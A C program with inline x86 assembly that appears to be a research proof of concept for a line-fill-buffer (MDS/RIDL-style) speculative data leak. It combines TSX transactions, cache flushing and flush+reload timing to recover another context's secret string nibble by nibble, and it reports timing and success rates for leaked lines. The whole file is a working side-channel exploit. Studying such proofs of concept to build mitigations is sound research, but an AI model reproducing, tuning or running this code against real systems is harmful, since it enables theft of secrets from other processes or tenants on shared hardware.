// gcc -O3 -DDEBUG_VALUES
// note: DEBUG_VALUES means we leak values from 0x1-0x8 and 0x11

#ifndef NO_USE_NIBBLES
 #define USE_NIBBLES
#endif

#ifndef NO_SSBM
 #define SSBM            /* Enable the store speculative bypass mitigation. */
#endif

#ifndef STRING_LEN
 #define STRING_LEN 64
#endif

#ifdef USE_NIBBLES
 #define NUM_CHUNKS STRING_LEN*2
#else
 #define NUM_CHUNKS STRING_LEN
#endif

#ifndef ITERS
 #define ITERS 20         /* The maximum number of leak attempts per nibble. */
#endif

#ifndef READ_OFFSET
 #define READ_OFFSET 0    /* The LFB entry offset we leak from. */
#endif

#ifndef OTHER_OFFSET
 #define OTHER_OFFSET 0x180
#endif

#define LATCH_FAST

#include <inttypes.h>
#include <stdio.h>
#include <ctype.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>

#include <sys/prctl.h>
#define PR_GET_SPECULATION_CTRL 52
#define PR_SET_SPECULATION_CTRL 53
#define PR_SPEC_DISABLE 4
	
#define nop "nop\n"
#define nop10 nop nop nop nop nop nop nop nop nop nop
#define nop100 nop10 nop10 nop10 nop10 nop10 nop10 nop10 nop10 nop10 nop10
#define nop1000 nop100 nop100 nop100 nop100 nop100 nop100 nop100 nop100 nop100 nop100

// This is optimal. 256 starts leaking across cache lines.
// (do not change this, it is hard-coded)
#ifdef USE_NIBBLES
 #define MAX_VALUE 16
 #define RELOAD_STRIDE 2048
#else
 #define MAX_VALUE 256
 #define RELOAD_STRIDE 512
#endif

#ifdef DEBUG_VALUES
 #define SECRET_VALUE 0x11
 #define DEBUG_VALUE_1 0x7
 #define DEBUG_VALUE_2 0x8
#else
 #define SECRET_VALUE 0x0
 #define DEBUG_VALUE_1 0x0
 #define DEBUG_VALUE_2 0x0
#endif

#define RELOAD_OFFSET 0x40

static inline __attribute__((always_inline)) uint64_t rdtscp(void) {
	uint64_t lo, hi;

	asm volatile("rdtscp\n" : "=a" (lo), "=d" (hi) :: "rcx");

	return (hi << 32) | lo;
}

static inline __attribute__((always_inline)) void clflush(volatile void *p) {
	asm volatile("clflush (%0)\n" :: "r" (p));
}

int main(int argc, char *argv[]) {
	__attribute__((aligned(4096))) size_t results[MAX_VALUE] = {0};
	size_t k;

#ifdef SSBM
	prctl(PR_SET_SPECULATION_CTRL, 0, 8, 0, 0);
	prctl(PR_SET_SPECULATION_CTRL, 0, 2, 0, 0); // should fail
	prctl(PR_GET_SPECULATION_CTRL, 0, 0, 0, 0);
#endif

	unsigned char *reloadbuffer = mmap((void *)0xb0000000, 2*4096*256, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0);
#ifdef DEBUG_VALUES
	memset((char *)reloadbuffer, 0x01, 2*4096*256);
#endif

	volatile unsigned char *leak = mmap((void *)0xd00000000, 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
#ifdef DEBUG_VALUES
	memset((char *)leak, 0x02, 4096);
#endif

	// note: hugetlb doesn't seem to matter for this one, but let's be quiet
	volatile unsigned char *randombuf = mmap((void *)0xc0000000, 1024*1024*2, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE | MAP_HUGETLB, -1, 0);
#ifdef DEBUG_VALUES
	memset((char *)randombuf+4096*0, 0x03, 4096*1);
	memset((char *)randombuf+4096*1, 0x04, 4096*1);
	memset((char *)randombuf+4096*2, 0x05, 4096*1);
	memset((char *)randombuf+4096*3, 0x06, 4096*1);
#endif

	volatile unsigned char *privatebuf = mmap((void *)0xac000000, 4096, PROT_READ | PROT_WRITE,
		MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);

	reloadbuffer = reloadbuffer + RELOAD_OFFSET;
	char *origreload = reloadbuffer;

	char *origrandom = randombuf;

	__attribute__((aligned(256))) char pos[256];
	memset(pos, 0x0, sizeof(pos));

	size_t num_chunks = 0;

	size_t current_hits = 0;
	size_t iters = 0;

        int n = argc < 2 ? 100 : strtol(argv[1], NULL, 0);
	while (1) {
#ifdef START_WITH
		if (num_chunks == 0) {
			pos[0] = argv[1][0];
#ifdef USE_NIBBLES
			num_chunks = 2;
#else
			num_chunks = 1;
#endif
		}
#endif

	size_t i;
	for (i = 0; i < ITERS; ++i) {
#ifdef LATCH_FAST
		if (num_chunks == 0 && i >= 10) break;
#endif

		// flush
		for (k = 0; k < MAX_VALUE; ++k) {
			clflush(reloadbuffer + k * RELOAD_STRIDE);
		}

		//asm volatile (nop1000);

		// This breaks the broadcast victim. Weird?
		//asm volatile("mfence");

#ifdef USE_NIBBLES
		size_t read_offset = ((num_chunks/2)/8)*8;
		size_t curr_offset = num_chunks%16;
		size_t src_offset = ((num_chunks/2)/8)*8;
#else
		size_t read_offset = ((num_chunks)/8)*8;
		size_t curr_offset = num_chunks%8;
		size_t src_offset = ((num_chunks)/8)*8;
#endif
#ifdef USE_NIBBLES
		if (num_chunks > 15) {
			size_t extra = ((((num_chunks/2) - 4)/4)*4);
#else
		if (num_chunks > 7) {
			size_t extra = ((((num_chunks) - 4)/4)*4);
#endif
			// start using known bytes from offset 4
			src_offset = extra;
			// so we need to remove 4 bits from our mask
#ifdef USE_NIBBLES
			curr_offset = num_chunks - extra*2;
#else
			curr_offset = num_chunks - extra;
#endif
			// and we need to read at an offset of 4 into the word
			read_offset = extra;
		}

		// rbx is existing data
		// rcx is shift
		// rdx is #values
		// r8 is mask
        	//  -> (~1 >> (64 - 8 - #bits))
        	//  e.g. if we have 8 bits then we shift 64-16=56 -> 0xffff
		// (for nibbles this is now 64-4-#bits)
		asm volatile(
			"movq $0xffffffffffffffff, %%r8\n"
			"mov %0, %%rdx\n"
#ifdef USE_NIBBLES
			"movq $60, %%rcx\n"
			"imul $4, %%rdx, %%rdx\n"
#else
			"movq $56, %%rcx\n"
			"imul $8, %%rdx, %%rdx\n"
#endif
			"sub %%dl, %%cl\n"
			"shr %%cl, %%r8\n"
			"movq (%1), %%rbx\n"
			::"r"(curr_offset), "r"(pos + src_offset): "rbx", "rcx", "rdx", "r8"
		);

		// leak
		asm volatile(
		"clflush (%0)\n"
		"sfence\n"
		"clflush (%2)\n"
		"xbegin abortpoint\n"

		// delay (this also helps capture more LFBs :o)
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"
		"vsqrtps %%xmm0, %%xmm0\n"

		"vsqrtps %%xmm0, %%xmm0\n"

		// temporal leak
		"movq (%0), %%rax\n"

		/*
		mask (r8), xor/subtract (rbx), rotate (cl bits)
		-> only matching values will be valid (in theory)
		TODO: what do we do with valid zeroes?
		*/
		"andq %%r8, %%rax\n"
		"subq %%rbx, %%rax\n"
		//"xorq %%rbx, %%rax\n"

		"movq %%rdx, %%rcx\n"
		"ror %%cl, %%rax\n"

		/*
		now we should have <zeros><8 bit new value>
		otherwise some of the <zeroes> will be non-zero..

		however we shift 9 bytes off the left end, below :o
		therefore we take a copy of the potentially non-zero bits
		and then we will XOR them after the shift
		*/

		"mov %%rax, %%rcx\n"
		"xor %%cl, %%cl\n" // clear lowest byte

#ifdef USE_NIBBLES
		"shl $0xb, %%rax\n"
#else
		"shl $0x9, %%rax\n"
#endif
		"xor %%rcx, %%rax\n"

		// load from flush+reload buffer
		"movntdqa (%%rax, %1), %%xmm0\n"

		"pause\n"

		"xend\n"
		"abortpoint:\n"
		::"r"(leak + READ_OFFSET + read_offset), "r"(reloadbuffer),"r"(randombuf + OTHER_OFFSET):"rax","rbx","rcx","rdx","r8"
		);

		asm volatile("mfence");

		// reload
		for (size_t k = 0; k < MAX_VALUE; ++k) {
			size_t x = ((k * 167) + 13) & (MAX_VALUE-1);
			unsigned char *p = reloadbuffer + (RELOAD_STRIDE * x);

			uint64_t t0 = rdtscp();
			*(volatile unsigned char *)p;
			uint64_t dt = rdtscp() - t0;

			if (dt < 80) {
				results[x]++;
#define THRESHOLD 2
				if (x && results[x] >= THRESHOLD)
					current_hits++;
			}
		}

		if (current_hits) {
			break;
		}
	}
	iters += (i+1);

	// print results
	size_t total = 0;
	size_t best = 0;
	size_t best_c = 0xff;
	for (size_t c = 0; c < MAX_VALUE; ++c) {
#ifdef PRINT_RES
		if (results[c] > 0) {
			printf("%d : %8zu: 0x%02x (%c)", num_chunks, results[c], (int)c, isprint(c)?c:' ');
			if (results[c] >= THRESHOLD) printf(" ***");
			printf("\n");
		}
		total += results[c];
#endif
		if (results[c] > best || ((results[c] > 1) && (best_c == 0))) {
			best = results[c];
			best_c = c;
		}
	}
	if (best_c != 0xff) {
#ifdef USE_NIBBLES
		if (num_chunks%2 == 0)
			pos[num_chunks/2] = best_c;
		else
			pos[num_chunks/2] |= (best_c << 4);
#else
		pos[num_chunks] = best_c;
#endif
		num_chunks++;
	} else {
		//printf("no results; got %d zeros\n", results[0]);
	}
	memset(results, 0, sizeof(results));

#if 0
	//if (num_chunks == STRING_LEN*2) {
#ifdef USE_NIBBLES
		for (int p = 0; p < num_chunks/2; ++p) { // pos
#else
		for (int p = 0; p < num_chunks; ++p) { // pos
#endif
			if ((pos[p] & 0xff) != 0x0) {
				if (isprint(pos[p] & 0xff)) printf("%c", pos[p] & 0xff);
				else printf(" ");
			} else {
				printf("?");
			}
		}
		printf("\n");
	//}
#endif

	current_hits = 0;

	// reject zero bytes
#ifdef USE_NIBBLES
	if (iters >= 12*num_chunks || (num_chunks > 1 && pos[(num_chunks-2)/2] == 0 && (num_chunks%2) == 0)) {
#else
	if (iters >= 2000 || (num_chunks && pos[num_chunks-1] == 0)) {
#endif
#ifdef DEBUG_PRINT
		printf("giving up on this round after %d iterations (got to chunk %d)\n", iters, num_chunks);
#else
		// meh
		printf("%s", "", iters, num_chunks);
#endif
		memset(pos, 0, sizeof(pos));
		num_chunks = 0;
		iters = 0;
	}

		if (num_chunks == NUM_CHUNKS) {
			size_t curr_pos = ((pos[1]-'0')*10) + (pos[2]-'0');
#ifdef DEBUG_PRINT
			printf("got entry %d; needed %d iterations (touched %d cache lines total)\n", curr_pos, iters, iters*MAX_VALUE);
#endif
			struct timeval time;
			static long long start_time;
			static long long last_seen_pos = -2;
			static size_t successes = 0;
			if (last_seen_pos != curr_pos && pos[63] == '8')
				successes++;
			if (curr_pos < last_seen_pos)
				successes = 0;
			if (curr_pos == 0) {
				gettimeofday(&time, NULL);
				start_time = ((long long)time.tv_sec * 1000 * 1000) + time.tv_usec;
				last_seen_pos = 0;
				successes = 1;
			} else if (last_seen_pos != 99 && curr_pos == 99) {
				gettimeofday(&time, NULL);
				long long end_time = ((long long)time.tv_sec * 1000 * 1000) + time.tv_usec;
				if (start_time) {
					printf("took %dusec to get %d/100 lines\n", end_time-start_time, successes);
				if (--n == 0)
				    exit(0);
				}
				last_seen_pos = -2;
				successes = 0;
			}
			last_seen_pos = curr_pos;

			memset(pos, 0, sizeof(pos));
			num_chunks = 0;
			iters = 0;

		}
	}
}

